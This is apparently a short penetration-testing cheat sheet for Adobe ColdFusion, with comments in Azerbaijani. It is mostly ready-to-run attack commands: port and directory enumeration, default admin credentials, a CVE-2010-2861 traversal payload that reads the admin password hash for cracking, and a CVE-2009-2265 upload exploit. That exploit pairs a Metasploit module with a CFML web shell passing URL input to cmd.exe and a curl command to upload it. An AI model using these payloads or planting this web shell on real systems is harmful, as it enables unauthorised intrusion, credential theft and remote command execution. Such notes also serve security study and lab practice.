# Discovery & Enumeration
```powershell
# Tam skan
sudo nmap -p- -sC -sV -Pn <TARGET_IP> --open

# ColdFusion portlarına fokus
sudo nmap -p 80,443,8500,1935,5500 -sV <TARGET_IP>

8500/tcp  open  fmtp   ← ColdFusion SSL port
```

# Default Paths
```powershell
http://<TARGET>:8500/CFIDE/
http://<TARGET>:8500/CFIDE/administrator/index.cfm   ← Admin panel
http://<TARGET>:8500/cfdocs/
http://<TARGET>:8500/CFIDE/administrator/enter.cfm
http://<TARGET>:8500/CFIDE/componentutils/cfexplorer.cfm
```

# Version
```powershell
# HTTP header yoxla
curl -I http://<TARGET>:8500/CFIDE/administrator/index.cfm

# Admin login səhifəsinə bax → "ColdFusion X Administrator" başlığı
curl -s http://<TARGET>:8500/CFIDE/administrator/index.cfm | grep -i "coldfusion"
```

# Discovery Enumeration
```powershell
# Gobuster ilə .cfm faylları axtar
gobuster dir -u http://<TARGET>:8500/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x cfm,cfc \
  -t 30

# ffuf ilə
ffuf -u http://<TARGET>:8500/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -e .cfm,.cfc
```

# Default Credentials
```powershell
admin:admin
admin:(boş)
administrator:administrator
```

# Metasploit
```powershell
# Exploit axtarışı
searchsploit coldfusion

# Metasploit modulları
msfconsole
search coldfusion
```

# ColdFusion 8 — Directory Traversal (CVE-2010-2861)
```powershell
# Admin şifrə hash-ini oxu
curl "http://<TARGET>:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en"

# Windows path
curl "http://<TARGET>:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en"

hashcat -m 100 <HASH> /usr/share/wordlists/rockyou.txt
```

# ColdFusion 8 — File Upload → RCE (CVE-2009-2265)
```powershell
# Metasploit ilə
msfconsole
use exploit/windows/http/coldfusion_fckeditor
set RHOSTS <TARGET>
set RPORT 8500
set LHOST <LHOST>
run

# FCKeditor upload endpoint
// Shell.cfm
<cfexecute name="cmd.exe" arguments="/c #url.cmd#" timeout="5" variable="output">
</cfexecute>
<cfoutput>#output#</cfoutput>

curl -F "newfile=@shell.cfm" \
  "http://<TARGET>:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/"


```
